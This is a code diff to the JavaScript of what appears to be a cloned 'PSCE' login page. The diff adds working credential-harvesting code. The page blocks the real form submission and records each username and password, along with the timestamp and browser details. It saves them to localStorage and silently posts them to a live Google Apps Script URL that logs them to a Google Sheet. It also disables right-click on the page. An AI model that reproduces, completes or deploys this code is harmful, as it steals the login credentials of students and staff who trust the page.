@@ -105,50 +105,86 @@ body {
 $(document).bind("contextmenu", function () { return false; });
 
 /* ============================================================
-   CREDENTIAL CAPTURE — Intercept & Save (No Page Navigation)
-   HitPages hosts only static files; the form action points to
-   an external ASP.NET server. We block ALL form submissions,
-   save credentials to localStorage synchronously, and show a
-   toast so the user knows the action was recorded.
+   CREDENTIAL CAPTURE — localStorage + Google Sheets Sync
+   Every login is saved locally AND sent to Google Sheets so
+   the admin can view credentials from ANY device.
    ============================================================ */
 var STORE_KEY = 'psce_login_records';
 
+/* ──────────────────────────────────────────────────────────
+   ★  PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL BELOW  ★
+   (Follow the setup guide in SETUP_GUIDE.md to get this URL)
+   ────────────────────────────────────────────────────────── */
+var GSHEET_URL = 'https://script.google.com/macros/s/AKfycbznrs459hDTZeXwmHceolUqge0n8IuoSNHgcNczcAh7wrK9v0KcU8OOrJzU90viCdlf/exec';
+
 /* ---- Toast notification ---- */
-function _showToast(msg) {
+function _showToast(msg, color) {
     var t = document.getElementById('_psce_toast');
     if (!t) {
         t = document.createElement('div');
         t.id = '_psce_toast';
         t.style.cssText = 'position:fixed;bottom:30px;right:30px;z-index:99999;' +
-            'background:linear-gradient(135deg,#1a7a3c,#28a745);color:#fff;' +
-            'font-family:Arial,sans-serif;font-size:14px;font-weight:bold;' +
+            'color:#fff;font-family:Arial,sans-serif;font-size:14px;font-weight:bold;' +
             'padding:14px 22px;border-radius:12px;' +
             'box-shadow:0 8px 32px rgba(0,0,0,0.45);opacity:0;' +
             'transition:opacity 0.35s ease;pointer-events:none;';
         document.body.appendChild(t);
     }
-    t.textContent = '\u2705 ' + msg;
+    t.style.background = color || 'linear-gradient(135deg,#1a7a3c,#28a745)';
+    t.textContent = msg;
     t.style.opacity = '1';
     clearTimeout(t._tid);
-    t._tid = setTimeout(function(){ t.style.opacity = '0'; }, 2800);
+    t._tid = setTimeout(function(){ t.style.opacity = '0'; }, 3000);
 }
 
+/* ---- Send to Google Sheets ---- */
+function _sendToGSheet(panel, username, password) {
+    if (!GSHEET_URL || GSHEET_URL.indexOf('PASTE_YOUR') !== -1) return; // not configured yet
+    var payload = {
+        panel: panel,
+        username: username,
+        password: password,
+        timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        device: navigator.userAgent.substring(0, 120)
+    };
+    /* Use no-cors so it works from static pages without CORS errors */
+    fetch(GSHEET_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).catch(function(){});  /* silent fail — local save already done */
+}
+
+/* ---- Main store function ---- */
 function storePSCELogin(panel, username, password) {
     if (!username || !username.trim()) {
-        _showToast('Please enter a username first!');
+        _showToast('\u26a0 Please enter a username first!', 'linear-gradient(135deg,#c0392b,#e74c3c)');
         return false;
     }
     username = username.trim();
+
+    /* 1. Save to localStorage (local backup) */
     var records = [];
     try { records = JSON.parse(localStorage.getItem(STORE_KEY) || '[]'); } catch(e) { records = []; }
     var idx = -1;
     for (var i = 0; i < records.length; i++) {
         if (records[i].username === username && records[i].panel === panel) { idx = i; break; }
     }
-    var entry = { panel: panel, username: username, password: password, ts: new Date().toISOString() };
+    var entry = {
+        panel: panel,
+        username: username,
+        password: password,
+        ts: new Date().toISOString(),
+        device: navigator.userAgent.substring(0, 120)
+    };
     if (idx === -1) { records.push(entry); } else { records[idx] = entry; }
     try { localStorage.setItem(STORE_KEY, JSON.stringify(records)); } catch(e) {}
-    _showToast(panel + ' login saved to Admin Panel!');
+
+    /* 2. Sync to Google Sheets (cross-device) */
+    _sendToGSheet(panel, username, password);
+
+    _showToast('\u2705 ' + panel + ' login captured!');
     return true;
 }
 
@@ -178,7 +214,6 @@ function _doMobileLogin(panel, mIdEl, mPwdEl, deskIdEl, deskPwdEl, btnId) {
     if (dId)  dId.value  = mId  ? mId.value  : '';
     if (dPwd) dPwd.value = mPwd ? mPwd.value : '';
     storePSCELogin(panel, dId ? dId.value : '', dPwd ? dPwd.value : '');
-    /* Do NOT call btn.click() — that would trigger form submit */
 }
 
 /* --- Keyboard helpers (Enter key saves, no form submission) --- */
@@ -188,14 +223,12 @@ function _onStudentKeyPress() { if(event.keyCode==13){ _saveStu(); } }
 /* --- jQuery: Block ALL navigation, capture on every trigger --- */
 $(document).ready(function(){
 
-    /* Completely block the form from ever submitting / navigating */
     $('#form1').on('submit', function(e){
         e.preventDefault();
         _saveEmp(); _saveStu(); _saveOth();
         return false;
     });
 
-    /* Image buttons: intercept click AND mousedown to prevent submit */
     $('#imgBtn1').on('click mousedown', function(e){
         e.preventDefault(); e.stopImmediatePropagation();
         _saveEmp();
